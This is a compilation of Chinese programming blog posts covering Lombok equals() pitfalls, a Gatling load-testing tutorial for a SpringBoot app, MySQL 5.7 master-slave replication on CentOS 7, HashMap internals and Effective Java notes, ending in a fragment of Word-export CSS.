        BaseVO other = (BaseVO)o;
        if (!other.canEqual(this)) {
            return false;
        } else if (!super.equals(o)) {
            return false;
        } else { 
            // 各项属性比较
        }
    }
}
如果一个类的父类是Object（java中默认没有继承关系的类父类都是Object），那么这里会调用Object的equals()方法，如下
public boolean equals(Object obj) {
    return (this == obj);
}
2.2 问题
对于父类是Object且使用了@EqualsAndHashCode(callSuper = true) 注解的类，这个类由lombok生成的equals()方法只有在两个对象是同一个对象时，才会返回true，否则总为false，无论它们的属性是否相同。这个行为在大部分时间是不符合预期的，equals()失去了其意义。即使我们期望equals()是这样工作的，那么其余的属性比较代码便是累赘，会大幅度降低代码的分支覆盖率。以一个近6000行代码的业务系统举例，是否修复该问题并编写对应测试用例，可以使整体的jacoco分支覆盖率提高10%~15%。
相反地，由于这个注解在jacoco下只算一行代码，未覆盖行数倒不会太多。
2.3 解决
有几种解决方法可以参考：

不使用该注解。大部分pojo我们是不会调用equals进行比较的，实际用到时再重写即可。
去掉callSuper = true。如果父类是Object，推荐使用。
重写父类的equals()方法，确保父类不会调用或使用类似实现的Ojbect的equals()。

2.4 其他
@data注解包含@EqualsAndHashCode注解，由于不调用父类equals()，避免了Object.equals()的坑，但可能带来另一个坑。详见@data章节。
3. @data
3.1 从一个坑出来掉到另一个大坑
上文提到@EqualsAndHashCode(callSuper = true) 注解的坑，那么 @data 是否可以避免呢？很不幸的是，这里也有个坑。
由于 @data 实际上就是用的 @EqualsAndHashCode，没有调用父类的equals()，当我们需要比较父类属性时，是无法比较的。示例如下：

@Data
public class ABO {
    private int a;

}

@Data
public class BBO extends ABO {

    private int b;

    public static void main(String[] args) {

        BBO bbo1 = new BBO();
        BBO bbo2 = new BBO();

        bbo1.setA(1);
        bbo2.setA(2);

        bbo1.setB(1);
        bbo2.setB(1);

        System.out.print(bbo1.equals(bbo2)); // true
    }
}
很显然，两个子类忽略了父类属性比较。这并不是因为父类的属性对于子类是不可见——即使把父类private属性改成protected，结果也是一样——而是因为lombok自动生成的equals()只比较子类特有的属性。
3.2 解决方法

用了 @data 就不要有继承关系，类似kotlin的做法，具体探讨见下一节
自己重写equals()，lombok不会对显式重写的方法进行生成
显式使用@EqualsAndHashCode(callSuper = true)。lombok会以显式指定的为准。

3.3 关于@data和data
在了解了 @data 的行为后，会发现它和kotlin语言中的data修饰符有点像：都会自动生成一些方法，并且在继承上也有问题——前者一旦有继承关系就会踩坑，而后者修饰的类是final的，不允许继承。kotlin为什么要这样做，二者有没有什么联系呢？在一篇流传较广的文章(抛弃 Java 改用 Kotlin 的六个月后，我后悔了(译文))中，对于data修饰符，提到：

Kotlin 对 equals()、hashCode()、toString() 以及 copy() 有很好的实现。在实现简单的DTO 时它非常有用。但请记住，数据类带有严重的局限性。你无法扩展数据类或者将其抽象化，所以你可能不会在核心模型中使用它们。
这个限制不是 Kotlin 的错。在 equals() 没有违反 Liskov 原则的情况下，没有办法产生正确的基于值的数据。

对于Liskov（里氏替换）原则，可以简单概括为：

一个对象在其出现的任何地方，都可以用子类实例做替换，并且不会导致程序的错误。换句话说，当子类可以在任意地方替换基类且软件功能不受影响时，这种继承关系的建模才是合理的。

根据上一章的讨论，equals()的实现实际上是受业务场景影响的，无论是否使用父类的属性做比较都是有可能的。但是kotlin无法决定equals()默认的行为，不使用父类属性就会违反了这个原则，使用父类属性有可能落入调用Object.equals()的陷阱，进入了两难的境地。
kotlin的开发者回避了这个问题，不使用父类属性并且禁止继承即可。只是kotlin的使用者就会发现自己定义的data对象没法继承，不得不删掉这个关键字手写其对应的方法。
回过头来再看 @data ，它并没有避免这些坑，只是把更多的选择权交给开发者决定，是另一种做法。
4. 后记
其他lombok注解实际使用较少，整体阅读了 官方文档暂时没有发现其他问题，遇到以后继续更新。
实际上官方文档中也提到了equals()的坑。

********************************************************************************************************************************************************************************************************
Gatling简单测试SpringBoot工程
 

 

前言
Gatling是一款基于Scala 开发的高性能服务器性能测试工具，它主要用于对服务器进行负载等测试，并分析和测量服务器的各种性能指标。目前仅支持http协议，可以用来测试web应用程序和RESTful服务。
除此之外它拥有以下特点：


支持Akka Actors 和 Async IO，从而能达到很高的性能


支持实时生成Html动态轻量报表，从而使报表更易阅读和进行数据分析


支持DSL脚本，从而使测试脚本更易开发与维护


支持录制并生成测试脚本，从而可以方便的生成测试脚本


支持导入HAR（Http Archive）并生成测试脚本


支持Maven，Eclipse，IntelliJ等，以便于开发


支持Jenkins，以便于进行持续集成


支持插件，从而可以扩展其功能，比如可以扩展对其他协议的支持


开源免费


 
依赖工具


Maven


JDK


Intellij IDEA


 
安装Scala插件
打开 IDEA ，点击【IntelliJ IDEA】 -> 【Preferences】 -> 【Plugins】，搜索 “Scala”，搜索到插件然后点击底部的 【Install JetBrains plugin…】安装重启即可。


 
Gatling Maven工程
创建Gatling提供的gatling-highcharts-maven-archetype,
在 IntelliJ中选择 New Project -> Maven -> Create form archetype -> Add Archetype，在弹出框中输入一下内容：

 GroupId: io.gatling.highcharts
 ArtifactId: gatling-highcharts-maven-archetype
 Version: 3.0.0-RC3

点击查看最新版本: 最新版本
之后输入你项目的GroupId(包名)和ArtifactId(项目名)来完成项目创建，
项目创建完成后，Maven会自动配置项目结构。

 



 
注:在创建的工程，修改pom.xml文件，添加如下配置,加快构建速度:

 <repositories>
      <repository>
        <id>public</id>
        <name>aliyun nexus</name>
        <url>http://maven.aliyun.com/nexus/content/groups/public/</url>
        <releases>
          <enabled>true</enabled>
        </releases>
      </repository>
    </repositories>
    <pluginRepositories>
      <pluginRepository>
        <id>public</id>
        <name>aliyun nexus</name>
        <url>http://maven.aliyun.com/nexus/content/groups/public/</url>
        <releases>
          <enabled>true</enabled>
        </releases>
        <snapshots>
          <enabled>false</enabled>
        </snapshots>
      </pluginRepository>
    </pluginRepositories>

 
工程项目目录
工程项目结构如下图：

 

项目目录说明：


bodies：用来存放请求的body数据


data：存放需要输入的数据


scala：存放Simulation脚本


Engine：右键运行跟运行 bin\gatling.bat 和bin\gatling.sh效果一致


Recorder：右键运行跟运行 bin\recorder.bat 和bin\recorder.sh效果一致，录制的脚本存放在scala目录下


target：存放运行后的报告


至此就可以使用IntelliJ愉快的开发啦。
 
Gatling测试SpringBoot
Gatling基于Scala开发的压测工具，我们可以通过录制自动生成脚本，也可以自己编写脚本，大家不用担心，首先脚本很简单常用的没几个，另外gatling封装的也很好我们不需要去专门学习Scala语法，当然如果会的话会更好。
SpringBoot测试工程示例
Maven依赖
代码如下

<parent>
          <groupId>org.springframework.boot</groupId>
          <artifactId>spring-boot-starter-parent</artifactId>
          <version>2.0.5.RELEASE</version>
          <relativePath/> <!-- lookup parent from repository -->
      </parent>
  ​
      <properties>
          <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
          <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
          <java.version>1.8</java.version>
      </properties>
  ​
      <dependencies>
          <dependency>
              <groupId>org.springframework.boot</groupId>
              <artifactId>spring-boot-starter-web</artifactId>
          </dependency>
  ​
          <dependency>
              <groupId>org.springframework.boot</groupId>
              <artifactId>spring-boot-starter-test</artifactId>
              <scope>test</scope>
          </dependency>
      </dependencies>

 
控制层接口
代码如下:

@RestController
  public class HelloWorldController {
      @RequestMapping("/helloworld")
      public String sayHelloWorld(){
          return "hello World !";
      }
  }

浏览器演示

 

Gatling测试脚本编写
Gatling基于Scala开发的压测工具，我们可以通过录制自动生成脚本，也可以自己编写脚本，大家不用担心，首先脚本很简单常用的没几个，另外gatling封装的也很好我们不需要去专门学习Scala语法，当然如果会的话会更好。
脚本示例

  import io.gatling.core.Predef._
  import io.gatling.http.Predef._
  ​
  class SpringBootSimulation extends Simulation{
    //设置请求的根路径
    val httpConf = http.baseUrl("http://localhost:8080")
    /*
      运行100秒 during 默认单位秒,如果要用微秒 during(100 millisecond)
     */
    val scn = scenario("SpringBootSimulation").during(100){
      exec(http("springboot_home").get("/helloworld"))
    }
    //设置线程数
    //  setUp(scn.inject(rampUsers(500) over(10 seconds)).protocols(httpConf))
    setUp(scn.inject(atOnceUsers(10)).protocols(httpConf))
  }

 
脚本编写

 

Gatling脚本的编写主要包含下面三个步骤


http head配置


Scenario 执行细节


setUp 组装


我们以百度为例，进行第一个GET请求测试脚本的编写，类必须继承 Simulation


配置下head，只是简单的请求下百度首页，所以只定义下请求的base url，采用默认的http配置即可

//设置请求的根路径
  val httpConf = http.baseURL("http://localhost:8080")

 


声明Scenario，指定我们的请求动作

val scn = scenario("SpringBootSimulation").during(100){
      exec(http("springboot_home").get("/helloworld"))
    }

 
scenario里的参数：scenario name   exec()里的参数就是我们的执行动作，http(“本次请求的名称”).get(“本次http get请求的地址”)


设置并发数并组装

 //设置线程数
  setUp(scn.inject(atOnceUsers(10)).protocols(httpConf))

atOnceUsers：立马启动的用户数，可以理解为并发数


这样我们一个简单的脚本就完成了，可以运行看下效果。
部分测试报告如下:


 
 

 
 
高级教程
Injection – 注入
注入方法用来定义虚拟用户的操作

 setUp(
    scn.inject(
      nothingFor(4 seconds), // 1
      atOnceUsers(10), // 2
      rampUsers(10) over(5 seconds), // 3
      constantUsersPerSec(20) during(15 seconds), // 4
      constantUsersPerSec(20) during(15 seconds) randomized, // 5
      rampUsersPerSec(10) to 20 during(10 minutes), // 6
      rampUsersPerSec(10) to 20 during(10 minutes) randomized, // 7
      splitUsers(1000) into(rampUsers(10) over(10 seconds)) separatedBy(10 seconds), // 8
      splitUsers(1000) into(rampUsers(10) over(10 seconds)) separatedBy atOnceUsers(30), // 9
      heavisideUsers(1000) over(20 seconds) // 10
    ).protocols(httpConf)
  )

 


nothingFor(duration)：设置一段停止的时间


atOnceUsers(nbUsers)：立即注入一定数量的虚拟用户

setUp(scn.inject(atOnceUsers(50)).protocols(httpConf))

 


rampUsers(nbUsers) over(duration)：在指定时间内，设置一定数量逐步注入的虚拟用户

setUp(scn.inject(rampUsers(50) over(30 seconds)).protocols(httpConf))

 


constantUsersPerSec(rate) during(duration)：定义一个在每秒钟恒定的并发用户数，持续指定的时间

 setUp(scn.inject(constantUsersPerSec(30) during(15 seconds)).protocols(httpConf))

 


constantUsersPerSec(rate) during(duration) randomized：定义一个在每秒钟围绕指定并发数随机增减的并发，持续指定时间

 setUp(scn.inject(constantUsersPerSec(30) during(15 seconds) randomized).protocols(httpConf))

 


rampUsersPerSec(rate1) to (rate2) during(duration)：定义一个并发数区间，运行指定时间，并发增长的周期是一个规律的值

 setUp(scn.inject(rampUsersPerSec(30) to (50) during(15 seconds)).protocols(httpConf))

 


rampUsersPerSec(rate1) to(rate2) during(duration) randomized：定义一个并发数区间，运行指定时间，并发增长的周期是一个随机的值

setUp(scn.inject(rampUsersPerSec(30) to (50) during(15 seconds) randomized).protocols(httpConf))

 


heavisideUsers(nbUsers) over(duration)：定义一个持续的并发，围绕和海维赛德函数平滑逼近的增长量，持续指定时间（译者解释下海维赛德函数，H(x)当x>0时返回1，x<0时返回0，x=0时返回0.5。实际操作时，并发数是一个成平滑抛物线形的曲线）

setUp(scn.inject(heavisideUsers(50) over(15 seconds)).protocols(httpConf))

 


splitUsers(nbUsers) into(injectionStep) separatedBy(duration)：定义一个周期，执行injectionStep里面的注入，将nbUsers的请求平均分配

setUp(scn.inject(splitUsers(50) into(rampUsers(10) over(10 seconds)) separatedBy(10 seconds)).protocols(httpConf))

 


splitUsers(nbUsers) into(injectionStep1) separatedBy(injectionStep2)：使用injectionStep2的注入作为周期，分隔injectionStep1的注入，直到用户数达到nbUsers

setUp(scn.inject(splitUsers(100) into(rampUsers(10) over(10 seconds)) separatedBy atOnceUsers(30)).protocols(httpConf))

 


循环

val scn = scenario("BaiduSimulation").
      exec(http("baidu_home").get("/"))

 
上面的测试代码运行时只能跑一次，为了测试效果，我们需要让它持续运行一定次数或者一段时间，可以使用下面两个方式：


repeat

  repeat(times，counterName)
  times:循环次数
  counterName:计数器名称，可选参数，可以用来当当前循环下标值使用，从0开始




 val scn = scenario("BaiduSimulation").repeat(100){
      exec(http("baidu_home").get("/"))
    }

 


during

during(duration, counterName, exitASAP)
  duration:时长，默认单位秒，可以加单位milliseconds，表示毫秒
  counterName:计数器名称，可选。很少使用
  exitASAP：默认为true,简单的可以认为当这个为false的时候循环直接跳出,可在
  循环中进行控制是否继续




  /*
      运行100秒 during 默认单位秒,如果要用微秒 during(100 millisecond)
     */
    val scn = scenario("BaiduSimulation").during(100){
      exec(http("baidu_home").get("/"))
    }

 
POST请求
post参数提交方式：


JSON方式

 import io.gatling.core.Predef._
  import io.gatling.core.scenario.Simulation
  import io.gatling.http.Predef._
  class JsonSimulation extends Simulation {
  val httpConf = http.baseURL("http://127.0.0.1:7001/tst")
  //注意这里,设置提交内容type
  val headers_json = Map("Content-Type" -> "application/json")
  val scn = scenario("json scenario")
      .exec(http("test_json")   //http 请求name
      .post("/order/get")     //post url
      .headers(headers_json)  //设置body数据格式
      //将json参数用StringBody包起,并作为参数传递给function body()
      .body(StringBody("{\"orderNo\":201519828113}")))
  setUp(scn.inject(atOnceUsers(10))).protocols(httpConf)
  }

 


Form方式

import io.gatling.core.Predef._
  import io.gatling.http.Predef._
  class FormSimulation extends Simulation {
  val httpConf = http
      .baseURL("http://computer-database.gatling.io")
  //注意这里,设置提交内容type
  val contentType = Map("Content-Type" -> "application/x-www-form-urlencoded")
  //声明scenario
  val scn = scenario("form Scenario")
      .exec(http("form_test") //http 请求name
      .post("/computers") //post地址, 真正发起的地址会拼上上面的baseUrl http://computer-database.gatling.io/computers
      .headers(contentType)
      .formParam("name", "Beautiful Computer") //form 表单的property name = name, value=Beautiful Computer
      .formParam("introduced", "2012-05-30")
      .formParam("discontinued", "")
      .formParam("company", "37"))
  setUp(scn.inject(atOnceUsers(1)).protocols(httpConf))



RawFileBody

  import io.gatling.core.Predef._
  import io.gatling.core.scenario.Simulation
  import io.gatling.http.Predef._
  class JsonSimulation extends Simulation {
  val httpConf = http.baseURL("http://127.0.0.1:7001/tst")
  //注意这里,设置提交内容type
  val headers_json = Map("Content-Type" -> "application/json")
  val scn = scenario("json scenario")
      .exec(http("test_json")   //http 请求name
      .post("/order/get")     //post url
      .headers(headers_json)  //设置body数据格式
      //将json参数用StringBody包起,并作为参数传递给function body()
      .body(RawFileBody("request.txt"))
  setUp(scn.inject(atOnceUsers(10))).protocols(httpConf)
  }

txt的文件内容为JSON数据，存放目录/resources/bodies下


 
Feed 动态参数
 Gatling对参数的处理称为Feeder[供料器]，支持主要有：


数组

 val feeder = Array(
  Map("foo" -> "foo1", "bar" -> "bar1"),
  Map("foo" -> "foo2", "bar" -> "bar2"),
  Map("foo" -> "foo3", "bar" -> "bar3"))

 


CSV文件

val csvFeeder = csv("foo.csv")//文件路径在 %Gatling_Home%/user-files/data/

 


JSON文件

 val jsonFileFeeder = jsonFile("foo.json")
  //json的形式：
  [
  {
      "id":19434,
      "foo":1
  },
  {
      "id":19435,
      "foo":2
  }
  ]

 


JDBC数据

jdbcFeeder("databaseUrl", "username", "password", "SELECT * FROM users")

 


Redis

可参看官方文档http://gatling.io/docs/2.1.7/session/feeder.html#feeder


使用示例：

import io.gatling.core.Predef._
import io.gatling.core.scenario.Simulation
import io.gatling.http.Predef._
import scala.concurrent.duration._
/**
* region请求接口测试
*/
class DynamicTest extends Simulation {
val httpConf = http.baseURL("http://127.0.0.1:7001/test")
//地区 feeder
val regionFeeder = csv("region.csv").random
//数组形式
val mapTypeFeeder = Array(
    Map("type" -> ""),
    Map("type" -> "id_to_name"),
    Map("type" -> "name_to_id")).random
//设置请求地址
val regionRequest =
    exec(http("region_map").get("/region/map/get"))
    //加载mapType feeder
    .feed(mapTypeFeeder)
    //执行请求, feeder里key=type, 在下面可以直接使用${type}
    .exec(http("province_map").get("/region/provinces?mType=${type}"))
    //加载地区 feeder
    .feed(regionFeeder)
    //region.csv里title含有provinceId和cityId,所以请求中直接引用${cityId}/${provinceId}
    .exec(http("county_map").get("/region/countties/map?mType=${type}&cityId=${cityId}&provinceId=${provinceId}"))
//声明scenario name=dynamic_test
val scn = scenario("dynamic_test")
        .exec(during(180){ regionRequest
        })
//在2秒内平滑启动150个线程(具体多少秒启动多少线程大家自己评估哈,我这里瞎写的)
setUp(scn.inject(rampUsers(150) over (2 seconds)).protocols(httpConf))
}

 
注意：通过下面的代码只会第一次调用生成一个随机数，后面调用不变

exec(http("Random id browse")
        .get("/articles/" + scala.util.Random.nextInt(100))
        .check(status.is(200))

 
Gatling的官方文档解释是，由于DSL会预编译，在整个执行过程中是静态的。因此Random在运行过程中就已经静态化了，不会再执行。应改为Feeder实现，Feeder是gatling用于实现注入动态参数或变量的，改用Feeder实现:

val randomIdFeeder = 
    Iterator.continually(Map("id" -> 
        (scala.util.Random.nextInt(100))))

feed(randomIdFeeder)
    .exec(http("Random id browse")
        .get("/articles/${id}"))
        .check(status.is(200))

feed()在每次执行时都会从Iterator[Map[String, T]]对象中取出一个值，这样才能实现动态参数的需求。


********************************************************************************************************************************************************************************************************
CentOS7下Mysql5.7主从数据库配置
本文配置主从使用的操作系统是Centos7，数据库版本是mysql5.7。
准备好两台安装有mysql的机器（mysql安装教程链接）
主数据库配置
每个从数据库会使用一个MySQL账号来连接主数据库，所以我们要在主数据库里创建一个账号，并且该账号要授予 REPLICATION SLAVE 权限
创建一个同步账号

create user 'repl'@'%' identified by 'repl_Pass1';

授予REPLICATION SLAVE权限：

GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';

要配置主数据库，必须要启用二进制日志，并且创建一个唯一的Server ID，打开mysql的配置文件并编辑（位置/etc/my.cnf），增加如下内容

log_bin=master-bin
log_bin_index = master-bin.index
server-id=4
expire-logs-days=7
binlog_ignore_db=mysql
binlog_ignore_db=information_schema
binlog_ignore_db=performation_schema
binlog_ignore_db=sys
binlog_do_db=mybatis

log_bin=master-bin 启动MySQL二进制日志
log_bin_index = master-bin.index
server-id=4  服务器唯一标识
expire-logs-days=7 二进制日志的有效期
binlog_ignore_db=mysql 不需要同步的数据库
binlog_ignore_db=information_schema
binlog_ignore_db=performation_schema
binlog_ignore_db=sys
binlog_do_db=mybatis 需要同步的数据库名字

重启mysql服务，查看主服务器状态：

show master status;


注意将方框里的两个值记录下来，后面在配置从数据库的时候用到。
 从数据库配置
同样编辑配置文件my.cnf，插入如下内容

server-id = 2
relay-log = slave-relay-bin
relay-log-index = slave-relay-bin.index


重启mysql服务，在slave服务器中登陆mysql，连接master主服务器数据库（参数根据实际填写）

change master to master_host='192.168.134.10', master_port=3306, master_user='repl', master_password='repl_Pass1', master_log_file='master-bin.000001', master_log_pos=2237；

启动slave

start slave;

测试主从是否配置成功
主从同步的前提必须是两个数据库都存在，本案例中我们需要建好两个名为mybatis的数据库
主库创建一个表

发现从库也创建了相同的表，然后发现主库的增删改操作都会自动同步。
 
********************************************************************************************************************************************************************************************************
HashMap 的数据结构
目录

content
append

content
HashMap 的数据结构：

数组 + 链表（Java7 之前包括 Java7）
数组 + 链表 + 红黑树（从 Java8 开始）

PS：这里的《红黑树》与链表都是链式结构。
HashMap 内部维护了一个数组，数组中存放链表的链首或红黑树的树根。
当链表长度超过 8 时，链表就转换为红黑树，利用红黑树快速增删改查的特点提高 HashMap 的性能；在红黑树结点数量小于 6 时，红黑树转变为链表。
下面分别为上面两种数据结构的图示：



【定位算法】
增加、查找、删除等操作都需要先定位到 table 数组的某个索引处。
定位算法为三步：取 key 的 hashCode 值、高位运算、取模运算得到索引位置。（代码如下）
static final int hash(Object key) {
    int h;
    // h = key.hashCode() 第一步 取 hashCode 值
    // h ^ (h >>> 16)  第二步 高位参与运算 Java8 优化了高位算法，优化原理忽略
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
}

// java7 中这是一个单独的方法，java8 没有了这个方法但是原理依旧
static int indexFor(int h, int length) {
    return h & (length-1); // hash(key) & (length-1)  第三步 取模
}
取模运算h & (length -1)的结果最大值为 length -1，不会出现数组下标越界的情况。
为什么要做高位运算？
如果 hashCode 值都大于 length，而且这些 hashCode 的低位变化不大，就会出现很多冲突，举个例子：

假设数组的初始化容量为 16（10000），则 length -1 位 15（1111）。
假设有几个对象的 hashCode 分别为 1100 10010、1110 10010、11101 10010，如果不做高位运算，直接使用它们做取模运算的结果将是一致的。

如果所有元素中多数元素属于这种情况，将会导致元素分布不均匀，而对 hashCode 进行高位运算能解决这个问题，使高位对低位造成影响改变低位的值，从而变相地使高位也参与运算。
append
【Q】负载因子与性能的关系
负载因子默认值为0.75，意味着当数组实际填充量占比达到3/4时就该扩容了。
负载因子越大，扩容次数必然越少，数组的长度越小，减少了空间开销；这就会导致 hash 碰撞越多，增加查询成本。
默认值0.75在时间和空间成本上寻求一种折衷。

【Q】为什么要扩容
因为随着元素量的增大，hash 碰撞的概率越来越大，虽然使用链地址法能够解决存储问题，但是长长的链表会让 HashMap 失去快速检索的优势，而扩容能解决这个问题。
********************************************************************************************************************************************************************************************************
《Effective Java》学习笔记 —— 通用程序设计
 
　　本章主要讨论局部变量、控制结构、类库、反射、本地方法的用法及代码优化和命名惯例。
 
第45条 将局部变量的作用域最小化
　　* 在第一次使用的它的地方声明局部变量（就近原则）。
　　* 几乎每个局部变量的声明都应该包含一个初始化表达式。如果还没有足够的信息进行初始化，就延迟这个声明（例外：try-catch语句块）。
　　* 如果在循环终止之后不再需要循环变量的内容，for循环优先于while循环。
　　* 使方法小而集中（职责单一）。
 
第46条 for-each循环优先于传统的for循环
　　* 如果正在编写的类型表示的是一组元素，即使选择不实现Collection，也要实现Iterable接口，以便使用for-each循环。
　　* for-each循环在简洁性和预防Bug方面有着传统for循环无法比拟的优势，且没有性能损失。但并不是所有的情况都能用for-each循环，如过滤、转换和平行迭代等。
　　存在Bug的传统for循环代码示例：

 1 import java.util.*;
 2 
 3 /**
 4  * @author https://www.cnblogs.com/laishenghao/
 5  * @date 2018/10/7
 6  */
 7 public class OrdinaryFor {
 8     enum Suit {
 9         CLUB, DIAMOND, HEART, SPADE,
10     }
11     enum Rank {
12         ACE, DEUCE, THREE, FOUR, FIVE,
13         SIX, SEVEN, EIGHT, NINE, TEN,
14         JACK, QUEEN, KING,
15     }
16 
17     public List<Card> createDeck() {
18         Collection<Suit> suits = Arrays.asList(Suit.values());
19         Collection<Rank> ranks = Arrays.asList(Rank.values());
20 
21         List<Card> deck = new ArrayList<>();
22         for (Iterator<Suit> i = suits.iterator(); i.hasNext(); ) {
23             for (Iterator<Rank> j = ranks.iterator(); j.hasNext(); ) {
24                 deck.add(new Card(i.next(), j.next()));
25             }
26         }
27         return deck;
28     }
29 
30 
31     static class Card {
32         final Suit suit;
33         final Rank rank;
34 
35         public Card(Suit suit, Rank rank) {
36             this.suit = suit;
37             this.rank = rank;
38         }
39 
40         // other codes
41     }
42 }

采用for-each循环的代码（忽略对Collection的优化）：

 1     public List<Card> createDeck() {
 2         Suit[] suits = Suit.values();
 3         Rank[] ranks = Rank.values();
 4 
 5         List<Card> deck = new ArrayList<>();
 6         for (Suit suit : suits) {
 7             for (Rank rank : ranks) {
 8                 deck.add(new Card(suit, rank));
 9             }
10         }
11         return deck;
12     }

 
第47条 了解和使用类库
　　* 优先使用标准类库，而不是重复造轮子。
 
第48条 如果需要精确的答案，请避免使用float和double
　　* float和double尤其不适合用于货币计算，因为要让一个float或double精确的表示o.1（或10的任何其他负数次方值）是不可能的。

System.out.println(1 - 0.9);

上述代码输出（JDK1.8）：

　　* 使用BigDecimal（很慢）、int或者long进行货币计算。
　
第49条 基本类型优先于装箱基本类型
　　* 在性能方面基本类型优于装箱基本类型。当程序装箱了基本类型值时，会导致高开销和不必要的对象创建。
　　* Java1.5中增加了自动拆装箱，但并没有完全抹去基本类型和装箱基本类型的区别，也没有减少装箱类型的风险。
　　如下代码在自动拆箱时会报NullPointerException：

  Map<String, Integer> values = new HashMap<>();
  int v = values.get("hello");

　　
　　再考虑两个例子：
例子1：输出true

Integer num1 = 10;Integer num2 = 10;System.out.println(num1 == num2);

例子2：输出false

    Integer num1 = 1000;
    Integer num2 = 1000;
    System.out.println(num1 == num2);

　　为啥呢？
　　我们知道 “==” 比较的是内存地址。而Java默认对-128到127的Integer进行了缓存（这个范围可以在运行前通过-XX:AutoBoxCacheMax参数指定）。所以在此范围内获取的Integer实例，只要数值相同，返回的是同一个Object，自然是相等的；而在此范围之外的则会重新new一个Integer，也就是不同的Object，内存地址是不一样的。
　　具体可以查看IntegerCache类：


 1     /**
 2      * Cache to support the object identity semantics of autoboxing for values between
 3      * -128 and 127 (inclusive) as required by JLS.
 4      *
 5      * The cache is initialized on first usage.  The size of the cache
 6      * may be controlled by the {@code -XX:AutoBoxCacheMax=<size>} option.
 7      * During VM initialization, java.lang.Integer.IntegerCache.high property
 8      * may be set and saved in the private system properties in the
 9      * sun.misc.VM class.
10      */
11 
12     private static class IntegerCache {
13         static final int low = -128;
14         static final int high;
15         static final Integer cache[];
16 
17         static {
18             // high value may be configured by property
19             int h = 127;
20             String integerCacheHighPropValue =
21                 sun.misc.VM.getSavedProperty("java.lang.Integer.IntegerCache.high");
22             if (integerCacheHighPropValue != null) {
23                 try {
24                     int i = parseInt(integerCacheHighPropValue);
25                     i = Math.max(i, 127);
26                     // Maximum array size is Integer.MAX_VALUE
27                     h = Math.min(i, Integer.MAX_VALUE - (-low) -1);
28                 } catch( NumberFormatException nfe) {
29                     // If the property cannot be parsed into an int, ignore it.
30                 }
31             }
32             high = h;
33 
34             cache = new Integer[(high - low) + 1];
35             int j = low;
36             for(int k = 0; k < cache.length; k++)
37                 cache[k] = new Integer(j++);
38 
39             // range [-128, 127] must be interned (JLS7 5.1.7)
40             assert IntegerCache.high >= 127;
41         }
42 
43         private IntegerCache() {}
44     }

IntegerCache
 
第50条 如果其他类型更适合，则尽量避免使用字符串
　　* 字符串不适合代替其他的值类型。
　　* 字符串不适合代替枚举类型。
　　* 字符串不适合代替聚集类型（一个实体有多个组件）。
　　* 字符串也不适合代替能力表（capacityies；capacity：能力，一个不可伪造的键被称为能力）。　　
 
第51条 当心字符串连接的性能
　　* 构造一个较小的、大小固定的对象，使用连接操作符（+）是非常合适的，但不适合运用在大规模的场景中。
　　* 如果数量巨大，为了获得可以接受的性能，请使用StringBuilder（非同步），或StringBuffer（线程安全，性能较差，一般不需要用到）。
 
第52条 通过接口引用对象
　　* 这条应该与“面向接口编程”原则一致。
　　* 如果有合适的接口类型存在，则参数、返回值、变量和域，都应该使用接口来进行声明。
如声明一个类成员应当优先采用这种方法：

private Map<String, Object> map = new HashMap<>();

而不是：

private HashMap<String, Object> map = new HashMap<>();

　　* 如果没有合适的接口存在，则完全可以采用类而不是接口。
　　* 优先采用基类（往往是抽象类）。
 
第53条 接口优先于反射机制
　　* 反射的代价：
　　　　（1）丧失了编译时进行类型检查的好处。
　　　　（2）执行反射访问所需要的代码非常笨拙和冗长（编写乏味，可读性差）。
　　　　（3）性能差。
 　　* 当然，对于某些情况下使用反射是合理的甚至是必须的。
 
第54条 谨慎地使用本地方法
　　* 本地方法（native method）主要有三种用途：
　　　　（1）提供“访问特定于平台的机制”的能力，如访问注册表（registry）和文件锁（file lock）等。
　　　　（2）提供访问遗留代码库的能力，从而可以访问遗留数据（legacy data）。
　　　　（3）编写代码中注重性能的部分，提高系统性能（不值得提倡，JVM越来越快了）。
　　* 本地方法的缺点：
　　　　（1）不安全（C、C++等语言的不安全性）。
　　　　（2）本地语言与平台相关，可能存在不可移植性。
　　　　（3）造成调试困难。
　　　　（4）增加性能开销。在进入和退出本地代码时需要一定的开销。如果本地方法只是做少量的工作，那就有可能反而会降低性能（这点与Java8的并行流操作类似）。
　　　　（5）可能会牺牲可读性。
 
第55条 谨慎地进行优化
　　* 有三条与优化相关的格言是每个人都应该知道的：
　　　　（1）More computing sins are committed in the name of efficiency (without necessarily achieving it)than for any other single reason——including blind stupidity.
　　　　　　 —— William AWulf
　　　　（2）We should forget about small efficiencies, say about 97% of the time: premature optimization is the root of all evil.
　　　　　　—— Donald E. Knuth
　　　　（3）We follow two rules in the matter of optimization:
 　　　　　　Rule 1. Don't do it.	　　　　　　Rule 2(for experts only). Don't do it yet——that is, not until you have a perfectly clear and unoptimized solution.
　　　　　　—— M. J. Jackson
　　以上格言说明：优化的弊大于利，特别是不成熟的优化。
　　* 不要因为性能而牺牲合理的结构。要努力编写好的程序而不是快的程序。
　　　　实现上的问题可以通过后期优化，但遍布全局且限制性能的结构缺陷几乎是不可能被改正的。但并不是说在完成程序之前就可以忽略性能问题。
　　* 努力避免那些限制性能的设计决策，考虑API设计决策的性能后果。
 
第56条 遵守普遍接受的命名惯例
　　* 把标准的命名惯例当作一种内在的机制来看待。
 
本文地址：https://www.cnblogs.com/laishenghao/p/effective_java_note_general_programming.html 
 
********************************************************************************************************************************************************************************************************
冯诺依曼存储子系统的改进






<!--
 /* Font Definitions */
 @font-face
    {font-family:宋体;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:黑体;
    panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
    {font-family:"Cambria Math";
    panose-1:2 4 5 3 5 4 6 3 2 4;}
@font-face
    {font-family:等线;
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:楷体;
    panose-1:2 1 6 9 6 1 1 1 1 1;}
@font-face
    {font-family:"\@黑体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@等线";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
@font-face
    {font-family:"\@楷体";}
@font-face
    {font-family:"\@宋体";
    panose-1:2 1 6 0 3 1 1 1 1 1;}
 /* Style Definitions */
 p.MsoNormal, li.MsoNormal, div.MsoNormal
    {margin:0cm;
    margin-bottom:.0001pt;
    text-align:justify;
    text-justify:inter-ideograph;
